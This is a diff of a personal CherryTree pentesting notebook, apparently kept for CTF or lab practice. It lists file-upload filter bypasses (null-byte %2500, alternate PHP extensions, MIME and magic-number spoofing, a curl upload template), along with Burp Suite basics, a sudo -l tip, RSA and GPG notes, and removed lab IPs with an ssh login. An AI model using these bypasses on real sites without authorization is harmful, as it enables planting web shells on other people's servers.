+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+basic ways to bypass client-side file upload filter:
+
+</rich_text>
+      <rich_text indent="1">Turn off Javascript in your browser
+Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter.
+Intercept and modify the valid dummy file upload. Change the MIME Type
+Send the file directly to the upload point. First intercept a successful upload to see the parameters being used in the upload</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">curl -X POST -F "submit:&lt;value&gt;" -F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;" &lt;site&gt;</rich_text>
+      <rich_text>
+
+
+restrictions on downloading (/uploading) file because of extensions (</rich_text>
+      <rich_text weight="heavy">&lt; PHP 5.0</rich_text>
+      <rich_text>): 
+</rich_text>
+      <rich_text indent="1">Example</rich_text>
+      <rich_text>: trying to download package.json.bak → 403 error: only .md and .pdf files can be downloaded
+</rich_text>
+      <rich_text indent="1">Bypass: use Poisen Null Byte</rich_text>
+      <rich_text> (%00), URL ENCODED = %2500 → add %2500 at the end and also add one of the allowed extensions
+
+Basic server-side filter bypass 
+</rich_text>
+      <rich_text indent="1">if filtering "PHP" on just “.”</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">instead of .PHP use .php3, .php4, .php5, .php7, .phps, .php-s, .pht or .phar</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Magic numbers</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">first add dummy characters to payload and then edit it in hexeditor</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">see: </rich_text>
+      <rich_text>https://en.wikipedia.org/wiki/List_of_file_signatures
+
+
+
+</rich_text>
+    </node>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699629845">
-    <rich_text>10.11.58.253
+  <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699550842">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+Check available sudo commands:
+</rich_text>
+    <rich_text indent="1">sudo -l</rich_text>
+  </node>
+  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1699869568">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+
+</rich_text>
+    <node name="Basic info" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697139099" ts_lastsave="1699449925">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Tools:
+</rich_text>
+      <rich_text indent="1" weight="heavy">Proxy</rich_text>
+      <rich_text indent="1">: Intercept and modify requests/responses when interacting with web applications.
+</rich_text>
+      <rich_text indent="1" weight="heavy">Repeater</rich_text>
+      <rich_text indent="1">: Capture, modify, then resend the same request numerous times. 
+</rich_text>
+      <rich_text indent="1" weight="heavy">Intruder</rich_text>
+      <rich_text indent="1">: Spray an endpoint with requests for bruteforce attacks or to fuzz endpoints.
+</rich_text>
+      <rich_text indent="1" weight="heavy">Decoder</rich_text>
+      <rich_text indent="1">: Decoding captured information, or encoding a payload prior to sending it to the target.
+</rich_text>
+      <rich_text indent="1" weight="heavy">Comparer</rich_text>
+      <rich_text indent="1">: Compare two pieces of data at either word or byte level.
+</rich_text>
+      <rich_text indent="1" weight="heavy">Sequencer</rich_text>
+      <rich_text indent="1">: Assess the randomness of tokens such as session cookie values or other supposedly random generated data. </rich_text>
+      <rich_text>
+
+Shortcuts:
+</rich_text>
+      <rich_text indent="1">Ctrl + Shift + D -&gt; Switch to the Dashboard
+Ctrl + Shift + T -&gt; Switch to the Target tab
+Ctrl + Shift + P -&gt; Switch to the Proxy tab
+Ctrl + Shift + I -&gt; Switch to the Intruder tab
+Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">Ctrl + U -&gt;</rich_text>
+      <rich_text>URL encode selected text
+
+
+
+</rich_text>
+    </node>
+    <node name="Finetune" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1699449922">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+intercepting only relevant data:
+</rich_text>
+      <rich_text indent="1">go to target
+add to scope
+go to proxy setting
+adjust interception rule to include scope only</rich_text>
+    </node>
+  </node>
+  <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1699441549">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+Useful tools:
+</rich_text>
+    <rich_text indent="1" link="webs https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="1" link="webs https://github.com/ius/rsatool">https://github.com/ius/rsatool</rich_text>
+    <rich_text>
+
+RSA:
+</rich_text>
+    <rich_text indent="1">Key variables:
+</rich_text>
+    <rich_text indent="2">p: large primenr
+q: large primenr
+m: plaintext message
+n: p * q
+e: +n= public key
+d: +n= private key
+c</rich_text>
+    <rich_text>: ciphertext
+
+GPG:
+</rich_text>
+    <rich_text indent="1">gpg --import</rich_text>
+    <rich_text indent="1" weight="heavy"> GPG_KEY_FILE</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">gpg </rich_text>
+    <rich_text indent="1" weight="heavy">ENCRYPTED_FILE</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">New file will be created with the plaintext</rich_text>
+  </node>
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699892190">
+    <rich_text>
 =================
-10.10.24.28
-
-ssh user3@10.10.24.28
-password
-
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH</rich_text>
+</rich_text>
   </node>
 </cherrytree>
